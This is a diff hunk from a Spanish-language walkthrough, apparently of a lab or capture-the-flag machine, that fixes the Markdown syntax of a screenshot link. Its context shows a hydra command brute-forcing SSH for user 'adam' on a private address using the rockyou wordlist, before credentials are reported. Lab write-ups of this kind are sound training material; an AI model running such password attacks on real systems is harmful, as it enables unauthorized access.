@@ -109,7 +109,7 @@ El usuario `adam` tiene shell asignada, lo que lo convierte en objetivo válido 
 ```bash
 hydra -l adam -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.144
 ```
-|[Fuerza bruta a SSH](screenshots/03-hydra-brute-force-ssh.png)
+![Fuerza bruta a SSH](screenshots/03-hydra-brute-force-ssh.png)
 
 Credenciales obtenidas:
 
